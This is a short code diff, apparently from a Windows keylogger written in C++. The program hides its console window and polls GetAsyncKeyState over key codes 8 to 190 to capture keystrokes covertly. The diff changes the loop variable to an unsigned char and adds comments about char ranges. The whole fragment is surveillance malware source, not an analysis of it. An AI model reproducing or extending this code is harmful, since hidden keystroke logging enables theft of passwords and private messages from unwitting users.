@@ -90,11 +90,15 @@ bool SpecialKeys(int S_Key) {
 int main()
 {
 	ShowWindow(GetConsoleWindow(), SW_HIDE);
-	char KEY = 'x';
+
+    // char goes from -128 to +127 and never reaches 190
+    // range of unsigned char is 0 till 255
+    // declaring char character and declaring another variable in for loop is memory inefficient
+	unsigned char KEY;
 
 	while (true) {
 		Sleep(10);
-		for (int KEY = 8; KEY <= 190; KEY++)
+		for (KEY = 8; KEY <= 190; KEY++)
 		{
 			if (GetAsyncKeyState(KEY) == -32767) {
 				if (SpecialKeys(KEY) == false) {
